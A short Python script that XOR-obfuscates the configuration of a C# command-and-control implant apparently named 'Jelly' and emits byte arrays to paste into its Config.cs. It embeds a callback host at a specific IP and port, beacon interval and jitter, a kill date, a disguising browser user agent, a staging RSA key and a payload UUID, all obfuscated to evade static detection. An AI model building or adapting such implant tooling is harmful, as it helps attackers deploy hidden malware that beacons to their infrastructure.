#!/usr/bin/env python3
"""
XOR Obfuscation tool for Jelly Config values
Generates the correct byte arrays for obfuscation
"""

def xor_obfuscate(text, xor_key=None):
    """XOR obfuscate a string"""
    if xor_key is None:
        xor_key = bytes([0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12])
    
    text_bytes = text.encode('utf-8')
    obfuscated = []
    for i, byte in enumerate(text_bytes):
        obfuscated.append(byte ^ xor_key[i % len(xor_key)])
    
    return obfuscated

def generate_csharp_byte_array(obfuscated_bytes):
    """Generate C# byte array syntax"""
    return "new byte[] { " + ", ".join(str(b) for b in obfuscated_bytes) + " }"

# HTTP Profile Values
http_values = {
    "callback_interval": "10",
    "callback_jitter": "23",
    "callback_port": "8443",
    "callback_host": "https://16.170.226.88",
    "post_uri": "data",
    "encrypted_exchange_check": "true",
    "proxy_host": "",
    "proxy_port": "",
    "proxy_user": "",
    "proxy_pass": "",
    "killdate": "2026-11-21",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
}

# Keys
staging_rsa_key = "gl8RB+whNyCog2/UNAdq1pnjdVpa+B3NhrHy597CRPo="
payload_uuid = "f0ce3024-e28b-4ce2-bedd-e99ebf36c74b"

print("=" * 80)
print("XOR OBFUSCATION VALUES FOR HTTP PROFILE")
print("=" * 80)

for key, value in http_values.items():
    obfuscated = xor_obfuscate(value)
    csharp_array = generate_csharp_byte_array(obfuscated)
    print(f'{{ "{key}", UnobfuscateString({csharp_array}) }},')

print("\n" + "=" * 80)
print("STAGING RSA PRIVATE KEY")
print("=" * 80)
obfuscated_rsa = xor_obfuscate(staging_rsa_key)
csharp_rsa = generate_csharp_byte_array(obfuscated_rsa)
print(f"public static string StagingRSAPrivateKey = UnobfuscateString({csharp_rsa});")

print("\n" + "=" * 80)
print("PAYLOAD UUID")
print("=" * 80)
obfuscated_uuid = xor_obfuscate(payload_uuid)
csharp_uuid = generate_csharp_byte_array(obfuscated_uuid)
print(f"public static string PayloadUUID = UnobfuscateString({csharp_uuid});")

print("\n" + "=" * 80)
print("COPY THE OUTPUT ABOVE INTO YOUR Config.cs")
print("=" * 80)
